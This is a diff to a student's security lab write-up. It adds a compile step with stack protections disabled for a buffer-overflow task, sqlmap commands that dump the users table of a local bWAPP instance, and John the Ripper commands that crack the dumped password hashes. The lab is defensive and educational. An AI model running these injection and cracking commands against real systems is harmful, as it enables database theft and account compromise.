@@ -52,9 +52,17 @@ before:
 after: 
 ![image](https://github.com/user-attachments/assets/25aee0e4-767d-4e09-9a94-71a10ed713df)
 
+**complie this code c to task1 and set sudo ./task1:**
+gcc task1.c -o task1 -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
+sudo ./task1
+
+**now get address of task1 like each step above:**
+
 **before attack:**
 ![image](https://github.com/user-attachments/assets/603431f1-e1fe-44d5-81da-17768aec7fce)
 **after attack:**
+![image](https://github.com/user-attachments/assets/4fdcfcd4-c549-4e68-8084-469c28001205)
+
 # Task2: Attack on the database of bWapp 
 ## Install:
 **Install bWapp:**
@@ -74,18 +82,21 @@ localhost:8025/install.php
 ![image](https://github.com/user-attachments/assets/131f0c6d-dc0d-46f8-acef-2655f0581e3c)
 
 **get valiable tables:**
-run: python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" --dbs --cookie "PHPSESSID=h6f6uromrvvjjk82mp26qv04g4; security_level=0"
+run: 
+python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" --dbs --cookie "PHPSESSID=h6f6uromrvvjjk82mp26qv04g4; security_level=0"
 
 ![image](https://github.com/user-attachments/assets/83a79a5b-1806-49a6-826b-7e101ec81231)
 
 ## question2:  Use sqlmap to get tables, users information
 **get tables:**
-run: python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP --tables --cookie "PHPSESSID=h6f6uromrvvjjk82mp26qv04g4; security_level=0"
+run: 
+python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP --tables --cookie "PHPSESSID=h6f6uromrvvjjk82mp26qv04g4; security_level=0"
 
 ![image](https://github.com/user-attachments/assets/7f30c176-7beb-4e72-a5d4-d44f9ebbf4e9)
 
 **get users information:**
-run python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP -T users --dump --cookie "PHPSESSID=h6f6uromrvvjjk82mp26qv04g4; security_level=0"
+run: 
+python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP -T users --dump --cookie "PHPSESSID=h6f6uromrvvjjk82mp26qv04g4; security_level=0"
 info of tables:
 
 ![image](https://github.com/user-attachments/assets/310dea9c-6304-4ba7-b3b7-3cf06dcc1d34)
@@ -94,4 +105,30 @@ data of tables:
 ![image](https://github.com/user-attachments/assets/cd36bebf-4431-41f1-a69d-c3f0b42e7ecf)
 
 ## question3:  Make use of John the Ripper to disclose the password of all database users from the above exploit
+**run (to get and save file password):**
+python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP -T users --dump --cookie "PHPSESSID=h6f6uromrvvjjk82mp26qv04g4; security_level=0" --output-dir= "C:\Users\LENOVO\Downloads"
 
+![image](https://github.com/user-attachments/assets/ee10ed6a-11e8-49b1-b041-1eab3a4877a2)
+
+because it is file .csv, so i'll convert it into file txt.
+**code convert:**
+
+![image](https://github.com/user-attachments/assets/1daa0695-8bdb-42bb-8ff6-240db1fddbbe)
+
+ouput file hashes.txt: 
+
+![image](https://github.com/user-attachments/assets/3020d8db-f1ef-4ff1-b9ca-198bc4fd2fab)
+
+**run cracked:**
+ ./john --incremental hashes.txt
+ ![image](https://github.com/user-attachments/assets/8df31ea1-e2c3-414e-845b-2d1a5467d4fe)
+
+ ./john --show hashes.txt
+![image](https://github.com/user-attachments/assets/dd3d5d41-a1ae-4b7e-b0c4-7b6965e6491f)
+
+so password is **bug**
+
+**result:**
+![image](https://github.com/user-attachments/assets/04431e25-9745-4667-91ff-97d0c8b64040)
+
+![image](https://github.com/user-attachments/assets/25a2de92-b972-4c00-a999-834c5609efe6)
